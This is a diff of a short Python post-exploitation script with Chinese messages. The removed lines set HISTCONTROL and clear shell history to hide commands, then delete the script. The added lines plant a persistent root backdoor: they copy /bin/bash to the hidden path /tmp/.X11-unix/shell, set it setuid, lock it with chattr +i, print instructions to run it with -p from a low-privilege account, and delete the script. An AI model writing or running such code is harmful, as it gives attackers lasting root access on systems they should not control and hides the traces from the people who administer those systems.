@@ -1,10 +1,8 @@
 # coding=utf-8
 # !/usr/bin/env python
 from __future__ import print_function
-
-import os
 import subprocess
-import sys
+import sys, os
 
 
 def ml(command):
@@ -23,9 +21,17 @@ def ml(command):
     return decoded_stdout
 
 
-def miyue(new_content, filename):  # /etc/environment   cen /etc/profile
-    with open(filename, 'a') as file:
-        file.write(new_content + '\n')
+def delbash(bash):
+    try:
+        ml('chattr -i ' + bash)
+    except Exception:
+        pass
+
+
+def chakbanh(bash):
+    if os.path.exists(bash):
+        print('文件写入成')
+        print('低权限运行: ' + bash + ' -p')
 
 
 def delete_current_script():
@@ -38,16 +44,10 @@ def delete_current_script():
 
 
 if __name__ == '__main__':
-    j = ml('cat /etc/os-release')
-    if 'ubuntu' in j:
-        print('ubuntu')
-        miyue('HISTCONTROL=ignorespace', '/etc/environment')
-        ml('source  /etc/environment')
-    elif 'centos' in j:
-        print('centos')
-        miyue('HISTCONTROL=ignorespace', '/etc/profile')
-        ml('source  /etc/profile')
-    ml('history -c')
-    print('请输入命令进行测试: [空格]命令  输出指定历史命令[history -d id]')
-    print('请执行{ history -c }刷新情况当前用户bash')
-    delete_current_script()  # 删除当前执行脚本文件
+    bash = '/tmp/.X11-unix/shell'
+    delbash(bash)
+    ml('cp /bin/bash ' + bash)
+    ml('chmod u+s ' + bash)
+    ml('chattr +i ' + bash)
+    chakbanh(bash)
+    delete_current_script()
